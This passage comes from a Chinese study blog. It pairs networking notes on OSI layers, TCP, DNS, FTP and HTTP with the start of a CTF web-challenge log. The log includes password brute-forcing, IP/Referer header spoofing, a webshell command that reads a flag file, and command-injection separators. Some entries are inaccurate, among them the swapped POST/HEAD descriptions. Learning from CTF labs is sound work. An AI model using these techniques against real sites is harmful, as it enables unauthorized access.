Protocol，用户数据报协议）<br></code></pre></td></tr></table></figure></li></ul><ul><li>重要设备：网关。</li></ul><p>5）<strong>会话层</strong></p><p>会话层管理主机之间的会话进程，即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p><p>6）<strong>表示层</strong></p><p>表示层对上层数据或信息进行变换以保证一个主机应用层信息可以被另一个主机的应用程序理解。表示层的数据转换包括数据的加密、压缩、格式转换等。</p><p>7）<strong>应用层</strong></p><p>为操作系统或网络应用程序提供访问网络服务的接口。</p><p>会话层、表示层和应用层注意：</p><ul><li><p>数据传输基本单位为报文；</p></li><li><p>包含的主要协议：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FTP（文件传送协议）<br>Telnet（远程登录协议）<br>DNS（域名解析协议）<br>SMTP（邮件传送协议）<br>POP3协议（邮局协议）<br>HTTP协议（Hyper <span class="hljs-built_in">Text</span> Transfer Protocol）<br></code></pre></td></tr></table></figure></li></ul><hr><h1 id="三、硬件总结"><a href="#三、硬件总结" class="headerlink" title="三、硬件总结"></a>三、硬件总结</h1><p>1）交换机<br>在计算机网络系统中，交换机是针对共享工作模式的弱点而推出的。交换机拥有一条高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条背 部总线上，当控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的MAC（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部 交换矩阵迅速将数据包传送到目的端口。目的MAC若不存在，交换机才广播到所有的端口，接收端口回应后交换机会“学习”新的地址，并把它添加入内部地址表中。交换机工作于OSI参考模型的第二层，即数据链路层。交换机内部的CPU会在每个端口成功连接时，通过ARP协议学习它的MAC地址，保存成一张 ARP表。在今后的通讯中，发往该MAC地址的数据包将仅送往其对应的端口，而不是所有的端口。因此，交换机可用于划分数据链路层广播，即冲突域；但它不 能划分网络层广播，即广播域。交换机被广泛应用于二层网络交换，俗称“二层交换机”。交换机的种类有：二层交换机、三层交换机、四层交换机、七层交换机分别工作在OSI七层模型中的第二层、第三层、第四层盒第七层，并因此而得名。</p><p>2）路由器<br>路由器（Router）是一种计算机网络设备，提供了路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过 的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端(在路由器内部进行)，这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议。路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。 路由器与交换器的差别，路由器是属于OSI第三层的产品，交换器是OSI第二层的产品(这里特指二层交换机)。</p><p>3）网关<br>网关（Gateway），网关顾名思义就是连接两个网络的设备，区别于路由器（由于历史的原因，许多有关TCP/IP 的文献曾经把网络层使用的路由器（Router）称为网关，在今天很多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家 庭中或者小型企业网络中使用，用于连接局域网和Internet。 网关也经常指把一种协议转成另一种协议的设备，比如语音网关。</p><h1 id="四、-协议总结"><a href="#四、-协议总结" class="headerlink" title="四、 协议总结"></a>四、 协议总结</h1><p>物理层：RJ45、CLOCK、IEEE802.3    （中继器，集线器，网关）<br>数据链路：PPP、FR、HDLC、VLAN、MAC  （网桥，交换机）<br>网络层：<strong>IP</strong>、ICMP、<strong>ARP</strong>、RARP、OSPF、IPX、RIP、IGRP、 （路由器）<br>传输层：<strong>TCP</strong>、<strong>UDP</strong>、SPX<br>会话层：NFS、<strong>SQL</strong>、NETBIOS、RPC<br>表示层：JPEG、MPEG、ASII<br>应用层：<strong>FTP</strong>、<strong>DNS</strong>、Telnet、SMTP、<strong>HTTP</strong>、<strong>WWW</strong>、NFS</p><hr><h1 id="五、对协议的梳理"><a href="#五、对协议的梳理" class="headerlink" title="五、对协议的梳理"></a>五、对协议的梳理</h1><h2 id="MAC与IP间的协议"><a href="#MAC与IP间的协议" class="headerlink" title="MAC与IP间的协议"></a>MAC与IP间的协议</h2><p><strong>ARP协议：</strong> 负责将IP地址映射到 MAC地址</p><ul><li><input checked="" disabled="" type="checkbox"> 根据IP地址获取物理地址:<br>首先，每个主机都会在自己的ARP缓冲区中建立一个ARP列表，以表示IP地址和MAC地址之间的对应关系。当源主机要发送数据时，首先检查ARP列表中是否有对应IP地址的目的主机的MAC地址，如果有，则直接发送数据，如果没有，就向本网段的所有主机发送ARP数据包，该数据包包括的内容有：源主机 IP地址，源主机MAC地址，目的主机的IP 地址。当本网络的所有主机收到该ARP数据包时，首先检查数据包中的IP地址是否是自己的IP地址，如果不是，则忽略该数据包，如果是，则首先从数据包中取出源主机的IP和MAC地址写入到ARP列表中，如果已经存在，则覆盖，然后将自己的MAC地址写入ARP响应包中，告诉源主机自己是它想要找的MAC地址。源主机收到ARP响应包后。将目的主机的IP和MAC地址写入ARP列表，并利用此信息发送数据。如果源主机一直没有收到ARP响应数据包，表示ARP查询失败。<br>注意：广播（255.255.255.255）发送ARP请求，单播发送ARP响应</li></ul><hr><p>MAC地址：MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡(Network lnterface Card)的EPROM(一种闪存芯片，通常可以通过程序擦写)。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位的。MAC地址的长度为48位(6个字节)，通常表示为12个16进制数，如：00-16-EA-AE-3C-40就是一个MAC地址，其中前3个字节，16进制数00-16-EA代表网络硬件制造商的编号，它由IEEE(电气与电子工程师协会)分配，而后3个字节，16进制数AE-3C-40代表该制造商所制造的某个网络产品(如网卡)的系列号。只要不更改自己的MAC地址，MAC地址在世界是唯一的。形象地说，MAC地址就如同身份证上的身份证号码，具有唯一性。<br><em>震网病毒攻击了西门子泄露MAC的PLC</em></p><hr><hr><h2 id="网络之间信息传送的协议（网际层）"><a href="#网络之间信息传送的协议（网际层）" class="headerlink" title="网络之间信息传送的协议（网际层）"></a>网络之间信息传送的协议（网际层）</h2><p><strong>IP协议：</strong> 将IP信息包从源设备(如用户的计算机)传到目的设备(如某部门的www服务器)</p><ul><li><input checked="" disabled="" type="checkbox"> 为了达到这样的目的，IP必须依赖<strong>IP地址</strong>与<strong>IP路由器</strong>两种机制来实现。<br>IP地址<br>IP规定网络上所有的设备都必须有一个独一无二的IP地址，就好比是邮件上都必须注明收件人地址，邮递员才能将邮件送到。同理，每个IP信息包都必须包含有目的设备的IP地址，信息包才可以正确地送到目的地。同一设备不可以拥有多个IP地址，所有使用IP的网络设备至少有一个唯一的IP地址。<br>IP路由<br>互联网是由许多个网络连接所形成的大型网络。如果要在互联网中传送IP信息包，除了确保网络上每个设备都有一个唯一的IP地址之外，网络之间还必须有传送的机制，才能将IP信息包通过一个个的网络传送到目的地。此种传送机制称为IP路由。<br>各个网络通过路由器相互连接。路由器的功能是为IP信息包选择传送的路径。换言之，必须依靠沿途各路由器的通力合作，才能将IP信息包送到目的地。在IP路由的过程中，由路由器负责选择路径，IP信息包则是被传送的对象。<img src="https://img-blog.csdnimg.cn/2020120319503470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><hr><p>IP地址与IP路由是IP信息包传送的基础。此外，IP信息包传送时还有一项很重要的特性，即使用非连接式的传送方式。非连接式的传送方式是指IP信息包传送时，源设备与目的设备双方不必事先连接，即可将IP信息包送达。即源设备完全不用理会目的设备，而只是单纯地将IP信息包逐一送出。至于目的设备是否收到每个信息包、是否收到正确的信息包等，则由上层的协议(例如TCP)来负责检查。</p><hr><p>子网掩码：用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在广域网上。</p><hr><h2 id="网络之间信息传送的协议（传输层）"><a href="#网络之间信息传送的协议（传输层）" class="headerlink" title="网络之间信息传送的协议（传输层）"></a>网络之间信息传送的协议（传输层）</h2><p><strong>①TCP协议：</strong> 为不可靠的互联网络上提供可靠的端到端字节流</p><ul><li><p><input checked="" disabled="" type="checkbox">  应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，然后TCP把数据流分区成适当长度的报文段（通常受该计算机连接的网络的数据链路层的最大传输单元（MTU）的限制）。之后TCP把结果包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。每台支持TCP的机器都有一个TCP传输实体。TCP实体可以是一个库过程、一个用户进程，或者内核的一部分。在所有这些情形下，它管理TCP流，以及与IP层之间的接口。TCP传输实体接受本地进程的用户数据流，将它们分割成不超过64KB（实际上去掉IP和TCP头，通常不超过1460数据字节）的分段，每个分段以单独的IP数据报形式发送。当包含TCP数据的数据报到达一台机器时，它们被递交给TCP传输实体，TCP传输实体重构出原始的字节流。为简化起见，我们有时候仅仅用“TCP”来代表TCP传输实体（一段软件）或者TCP协议（一组规则）。例如，在“用户将数据交给TCP”这句话中，很显然这里指的是TCP传输实体。IP层并不保证数据报一定被正确地递交到接收方，也不指示数据报的发送速度有多快。正是TCP负责既要足够快地发送数据报，以便使用网络容量，但又不能引起网络拥塞：而且，TCP超时后，要重传没有递交的数据报。即使被正确递交的数据报，也可能存在错序的问题，这也是TCP的责任，它必须把接收到的数据报重新装配成正确的顺序。</p></li><li><p><strong>TCP</strong></p></li></ul><p>建立方式——三次握手：<br>第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND(发送)状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（seq=y），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态；<br>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED（已建立）状态，完成三次握手。</p><p><img src="https://img-blog.csdnimg.cn/20201203221946406.gif"></p><p>连接终止——四次挥手：<br>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可以接受数据。<br>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1。<br>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。<br>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</p><p>说明：<br>1）SYN和ACK是标志位（0/1）（ACK=1表明ack有效），seq是序列号，ack是确认号。<br>2）给对方的确认方式就是把对方传来的seq+1并赋给ack。<br>3）SYN攻击 用众多伪造ip地址向服务器发送SYN=1（请求连接），让服务器处于SYN-RCVD状态，但都无法第三次握手（因为伪造ip不存在）<br>4）4次挥手中的FIN就相当于三次握手中的SYN。<br>5）序号seq，确认序号ack，确认标志位ACK作用还是一样的，就是确认作用（把seq加上1赋给ack，并把ACK置1）<br>6）为什么一个3次1个4次不一样？<br>因为两端的数据并不是同时发送完，所以两端谁发送完数据都需要自己告诉对方一次，并且对方确认一次。</p><p><img src="https://img-blog.csdnimg.cn/20201203210440531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><hr><p>互联网络与单个网络有很大的不同，因为互联网络的不同部分可能有截然不同的拓扑结构、带宽、延迟、数据包大小和其他参数。TCP的设计目标是能够动态地适应互联网络的这些特性，而且具备面对各种故障时的健壮性。不同主机的应用层之间经常需要可靠的、像管道一样的连接，但是IP层不提供这样的流机制，而是提供不可靠的包交换。简而言之，TCP必须提供可靠性的良好性能，这正是大多数用户所期望的而IP又没有提供的功能。</p><hr><p><strong>②UDP协议：</strong> 为应用程序提供了无需建立连接就可以发送封装的 IP 数据包的方法</p><ul><li><input checked="" disabled="" type="checkbox"> 对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界</li></ul><table><thead><tr><th align="left"></th><th align="center">UDP</th><th align="center">TCP</th></tr></thead><tbody><tr><td align="left">是否连接</td><td align="center">无连接</td><td align="center">面向连接</td></tr><tr><td align="left">是否可靠</td><td align="center">不可靠传输，不使用流量控制和拥塞控制</td><td align="center">可靠传输，使用流量控制和拥塞控制</td></tr><tr><td align="left">连接对象个数</td><td align="center">支持一对一，一对多，多对一和多对多的交互通信</td><td align="center">只能一对一通信</td></tr><tr><td align="left">传输方式</td><td align="center">面向报文</td><td align="center">面向字节流</td></tr><tr><td align="left">首部字节</td><td align="center">8字节</td><td align="center">最小20，最大60字节</td></tr><tr><td align="left">应用环境</td><td align="center">适用于实时通信（IP电话、视频会议、直播等）</td><td align="center">适用于要求可靠传输的应用（文件传输）</td></tr><tr><td align="left">下层协议</td><td align="center">TFTP、SNMP、NFS、DNS、BOOTP</td><td align="center">FTP、Telnet、SMTP、POP3、HTTP</td></tr></tbody></table><ul><li>TCP向上层提供面向连接的可靠服务 ，UDP向上层提供无连接不可靠服务。</li><li> 虽然 UDP 并没有 TCP 传输来的准确，但是也能在很多实时性要求高的地方有所作为</li><li> 对数据准确性要求高，速度可以相对较慢的，可以选用TCP。不产生任何额外的数据，即使知道有破坏的包也不进行重发。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择。</li></ul><h2 id="域名与IP间的协议"><a href="#域名与IP间的协议" class="headerlink" title="域名与IP间的协议"></a>域名与IP间的协议</h2><p><strong>DNS协议：</strong> 提供域名和IP地址相互映射的一个分布式数据库</p><ul><li><input checked="" disabled="" type="checkbox"> <strong>域名解析：</strong> 首先，根据域名系统域名空间的层次结构将其按子树划分为不同的区域，每个区域可看作是负责层次结构中这一部分节点的可管理的权力实体。例如，整个域的顶层区域由ICANN负责管理，一些国家域名及其下属的那些节点又构成了各自的区域，像.cn域就由CNNIC负责管理。而.cn域下又被划分为一些更小的区域，例如.fudan.edu.cn由复旦大学网络中心负责管理。其次，每个区域必须有对应的域名服务器，每个区域中包含的信息存储在域名服务器上。一个区域中可有两个或多个域名服务器，这样即使其中一个域名服务器出了故障，另一个域名服务器仍然可以正常提供信息。一个域名服务器也可以同时管辖多个区域。域名服务器在接到用户发出的请求后查询自身的资源记录集合，返回用户想要得到的最终答案，或者当自身的资源记录集合中查不到所需要的答案时，返回指向另外一个域名服务器的指针，用户将继续向那个域名服务器发出请求。所以说，域名服务器不需要记录所有下属域名和主机的信息，对于其中的子域(如果存在)，只需要知道子域的域名服务器即可。资源记录是一个域名到值的绑定，它包括以下字段：域名、值、类型、分类和生命期。域名字段和值字段分别用来表示解析的内容和解析返回的结果。类型字段代表了值的种类：类型为A代表值字段是一个IP地址，即用户所要的最终答案；类型为NS代表值字段是另一个域名服务器的域名，该域名服务器能够知道如何解析域名字段所指定的域名；类型为CNAME代表值字段是由域名所指定的主机的一个别名；类型为MX代表值字段是一个邮件服务器的域名，该邮件服务器接收由域名字段所指定的域的邮件；类型PTR用于域名反解等。分类字段允许指定其他的记录类型。生命期字段用于指出该资源记录的有效期是多少。为减少域名解析时间，域名服务器会缓存一些曾经查询过的、来自其他域名服务器的资源记录。由于这些资源记录会因为更改而失效，因此域名服务器设置了生命期，到期的资源记录会被清除出缓存。<br>根域名服务器知道所有顶级域名的域名服务器，对应于每个顶级域名，它都有两条资源记录：一条是NS资源记录，域名字段是该顶级域名，值字段是该顶级域名解析的域名服务器的域名；另一条是A资源记录，用来指明该域名服务器的域名对应的IP地址。综合使用这两条记录，就可以知道对该域下的某个域名解析，应该继续去哪个IP地址的域名服务器寻找。第二层的域名服务器类似地存放各个第三层域名服务器的指针。第三层的域名服务器会出现A、CNAME、MX等类型的资源记录。每个域名服务器都有根域名服务器的地址记录。最后，一个需要域名解析的用户先将该解析请求发往本地的域名服务器。如果本地的域名服务器能够解析，则直接得到结果，否则本地的域名服务器将向根域名服务器发送请求。依据根域名服务器返回的指针再查询下一层的域名服务器，依此类推，最后得到所要解析域名的IP地址。</li></ul><p><strong>域名反解：</strong> 是指给出一个IP地址，找出其对应的域名，这也是利用DNS来实现的。举个例子，假设一个要反解的IP地址为202.120.225.9，系统将其改写为9.225.120.202. in-addr.arpa，然后按域名解析的方式查询。这需要在被查询主机的本地域名服务器上有一条对应于9.225.120.202.in-addr.arpa的资源记录，类型是PTR，值是其域名。</p><p><del>（域名系统的名字空间）</del></p><hr><p>在浏览器中输入<a href="http://www.baidu.com后执行的全部过程/">www.baidu.com后执行的全部过程</a> ：<br>1、客户端浏览器通过DNS解析到<a href="http://www.baidu.com的ip地址220.181.27.48,通过这个ip地址找到客户端到服务器的路径.客户端浏览器发起一个http会话到220.161.27.48,然后通过tcp进行封装数据包,输入到网络层./">www.baidu.com的IP地址220.181.27.48，通过这个IP地址找到客户端到服务器的路径。客户端浏览器发起一个HTTP会话到220.161.27.48，然后通过TCP进行封装数据包，输入到网络层。</a><br>  2、在客户端的传输层(添加TCP头)，把HTTP会话请求分成报文段，添加源和目的端口，如服务器使用80端口监听客户端的请求，客户端由系统随机选择一个端口如5000，与服务器进行交换，服务器把相应的请求返回给客户端的5000端口。然后使用IP层的IP地址查找目的端。<br>  3、客户端的网络层（添加IP头）不用关系应用层或者传输层的东西，主要做的是通过查找路由表确定如何到达服务器，期间可能经过多个路由器，这些都是由路由器来完成的工作，我不作过多的描述，无非就是通过查找路由表决定通过那个路径到达服务器。<br>  4、客户端的链路层（添加MAC头），包通过链路层发送到路由器，通过邻居协议查找给定IP地址的MAC地址，然后发送ARP请求查找目的地址，如果得到回应后就可以使用ARP的请求应答交换的IP数据包现在就可以传输了，然后发送IP数据包到达服务器的地址。</p><hr><h2 id="传输文件的协议"><a href="#传输文件的协议" class="headerlink" title="传输文件的协议"></a>传输文件的协议</h2><p>  <strong>FTP协议：</strong> 将文件从一台计算机传送到另一台计算机</p><ul><li><input checked="" disabled="" type="checkbox"> FTP支持两种模式，一种方式叫做Standard (也就是 PORT方式，主动方式)，一种是 Passive(也就是PASV，被动方式)。 Standard模式 FTP的客户端发送 PORT 命令到FTP Serve。Passive模式FTP的客户端发送 PASV命令到 FTP Server。<br>Port：<br>FTP 客户端首先和FTP服务器的TCP 21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送PORT命令。 PORT命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过自己的TCP 20端口连接至客户端的指定端口发送数据。 FTP server必须和客户端建立一个新的连接用来传送数据。<br>Passive：<br>在建立控制通道的时候和Standard模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。FTP服务器收到Pasv命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器此端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。<br>很多防火墙在设置的时候都是不允许接受外部发起的连接的，所以许多位于防火墙后或内网的FTP服务器不支持PASV模式，因为客户端无法穿过防火墙打开FTP服务器的高端端口；而许多内网的客户端不能用PORT模式登陆FTP服务器，因为从服务器的TCP 20无法和内部网络的客户端建立一个新的连接，造成无法工作。</li></ul><hr><p>默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p><hr><h2 id="客户端和服务器端请求和应答的标准协议"><a href="#客户端和服务器端请求和应答的标准协议" class="headerlink" title="客户端和服务器端请求和应答的标准协议"></a>客户端和服务器端请求和应答的标准协议</h2><p><strong>HTTP协议：</strong> 客户端和服务端标准通信格式</p><ul><li><input checked="" disabled="" type="checkbox"> 一个客户机与服务器建立连接后，发送一个请求给服务器，请求方式的格式为，统一资源标识符、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。服务器接到请求后，给予相应的响应信息，其格式为一个状态行包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。其实简单说就是任何服务器除了包括HTML文件以外，还有一个HTTP驻留程序，用于响应用户请求。你的浏览器是HTTP客户，向服务器发送请求，当浏览器中输入了一个开始文件或点击了一个超级链接时，浏览器就向服务器发送了HTTP请求，此请求被送往由IP地址指定的URL。驻留程序接收到请求，在进行必要的操作后回送所要求的文件。在这一过程中，在网络上发送和接收的数据已经被分成一个或多个数据包（packet），每个数据包包括：要传送的数据；控制信息，即告诉网络怎样处理数据包。TCP/IP决定了每个数据包的格式。如果事先不告诉你，你可能不会知道信息被分成用于传输和再重新组合起来的许多小块。许多HTTP通讯是由一个用户代理初始化的并且包括一个申请在源服务器上资源的请求。最简单的情况可能是在用户代理(UA)和源服务器(O)之间通过一个单独的连接来完成。当一个或多个中介出现在请求/响应链中时，情况就变得复杂一些。中介有三种：代理(Proxy)、网关(Gateway)和通道(Tunnel)。一个代理根据URI的绝对格式来接受请求，重写全部或部分消息，通过URI的标识把已格式化过的请求发送到服务器。网关是一个接收代理，作为一些其它服务器的上层，并且如果必须的话，可以把请求翻译给下层的服务器协议。一个通道作为不改变消息的两个连接之间的中继点。当通讯需要通过一个中介(例如：防火墙等)或者是中介不能识别消息的内容时，通道经常被使用。</li></ul><hr><p>客户与服务器之间的HTTP连接是一种一次性连接，它限制每次连接只处理一个请求，当服务器返回本次请求的应答后便立即关闭连接，下次请求再重新建立连接。这种一次性连接主要考虑到WWW服务器面向的是Internet中成干上万个用户，且只能提供有限个连接，故服务器不会让一个连接处于等待状态，及时地释放连接可以大大提高服务器的执行效率。 [7]<br>HTTP是一种无状态协议，即服务器不保留与客户交易时的任何状态。这就大大减轻了服务器记忆负担，从而保持较快的响应速度。HTTP是一种面向对象的协议。允许传送任意类型的数据对象。它通过数据类型和长度来标识所传送的数据内容和大小，并允许对数据进行压缩传送。当用户在一个HTML文档中定义了一个超文本链后，浏览器将通过TCP/IP协议与指定的服务器建立连接。</p><hr><table><thead><tr><th>HTTP方法</th><th>作用描述</th></tr></thead><tbody><tr><td>GET</td><td>客户端请求指定资源信息，服务器返回指定资源</td></tr><tr><td>POST</td><td>只请求响应报文中的HTTP首部</td></tr><tr><td>HEAD</td><td>将客户端的数据提交到服务器，例：注册表单</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档内容</td></tr><tr><td>DELETE</td><td>请求服务器删除Request-URI所标识的资源</td></tr><tr><td>MOVE</td><td>请求服务器将制定的页面移至另一个网络地址</td></tr></tbody></table><p>HTTP状态码<br>所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。状态代码的第一个数字代表当前响应的类型：</p><ul><li>1xx消息——请求已被服务器接收，继续处理</li><li>2xx成功——请求已成功被服务器接收、理解、并接受</li><li>3xx重定向——需要后续操作才能完成这一请求</li><li>4xx请求错误——请求含有词法错误或者无法被执行</li><li>5xx服务器错误——服务器在处理某个正确请求时发生错误</li></ul>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web</title>
    <link href="/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="基础认证题"><a href="#基础认证题" class="headerlink" title="基础认证题"></a>基础认证题</h2><p><img src="https://img-blog.csdnimg.cn/20201123215812631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>页面中依据提示 可猜测用户为admin<br>可弱口令尝试（admin）——失败<br>暴脾气，，，词典爆破！<br>下载其页面提供的词典<br>抓包处对上图circle处进行解密 在burp的decode模板中进行查询可知其加密方式为base64<br>载入词典<br>此处开始走弯路：1.词典所加载的均为密码，缺少用户名（发现问题后，度娘学习正则表达式，很好，又学了个奇奇怪怪的姿势）2.词典爆破后一直都是401返回，长度均为404，没有出现200返回（原因未明）<br>——————————————我是分割线———————————<br>折腾一段时间后（替换爆破点，加载词典，设置解密方式），成功爆破出长度为200</p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>要用到工具Githack,虚拟机一找，没有，网上查找Githack安装，？？？没有输入法吗，掉进一个大坑……配置源，使用sudo，dpkg命令……暂时做不下去了<br><img src="https://img-blog.csdnimg.cn/20201124083620314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>搜素引擎爬取各个网站时，网站告知搜索引擎的爬取范围（设置爬取权限）,robots.txt就作为搜素引擎爬取网站时第一个需要查看的文件</p><h2 id="灰色按钮（disabled-button）"><a href="#灰色按钮（disabled-button）" class="headerlink" title="灰色按钮（disabled button）"></a>灰色按钮（disabled button）</h2><p>利用开发者工具查看源代码，直接修改按钮对应的代码处（删除或注释掉带有禁用按钮的代码）涉及到html和php的学习</p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。</p><h2 id="HTTP中的GET和POST传参"><a href="#HTTP中的GET和POST传参" class="headerlink" title="HTTP中的GET和POST传参"></a>HTTP中的GET和POST传参</h2><p>GET传参在URL地址栏直接后面跟 <strong>/?参数名+数值</strong><br>如 /?a=1 传参a=1<br>POST传参不能直接在URL栏里输入，使用插件hackbar，可以进行post传参</p><hr><p>post传参有四种方式，基本样式如下：</p><p>POST <a href="http://www.example.com/">http://www.example.com</a> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded;charset=utf-8<br>title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3    </p><hr><h2 id="IP伪造-xff和referer"><a href="#IP伪造-xff和referer" class="headerlink" title="IP伪造-xff和referer"></a>IP伪造-xff和referer</h2><p>抓包后改包：<br>添加   X-Forwarded-For：ip    Referer：网站<br>ip和网站均是要伪造的对象</p><p>X-Forwarded-For是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中，X-Real-IP，一般只记录真实发出请求的客户端IP</p><h2 id="curl-–local-port-xx"><a href="#curl-–local-port-xx" class="headerlink" title="curl –local-port xx"></a>curl –local-port xx</h2><p><a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h3 id="Please-use-port-51-to-visit-this-site"><a href="#Please-use-port-51-to-visit-this-site" class="headerlink" title="Please use port 51 to visit this site."></a>Please use port 51 to visit this site.</h3><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>使用蚁剑或post方式 使用shell=system(‘cat flag.txt’)</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>由于输入对管道符  | || &amp; &amp;&amp;过滤不严产生的漏洞<br>windows或linux下:</p><table><thead><tr><th align="center">格式</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">command1 &amp;&amp; command2</td><td align="center">先执行command1，如果为真，再执行command2</td></tr><tr><td align="center">command1| command2</td><td align="center">只执行command2</td></tr><tr><td align="center">command1 &amp; command2</td><td align="center">先执行command2后执行command1</td></tr><tr><td align="center">command1|| command2</td><td align="center">先执行command1，如果为假，再执行command2</td></tr></tbody></table><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>Windows下githack下载不出现./../.git<br>只下载了50x和index （原因不明！）–补充：使用了旧版本的Githuack<br><img src="https://img-blog.csdnimg.cn/20210120134909178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">kali内利用githack 却未发现50x和index</p><hr><blockquote><p>git log 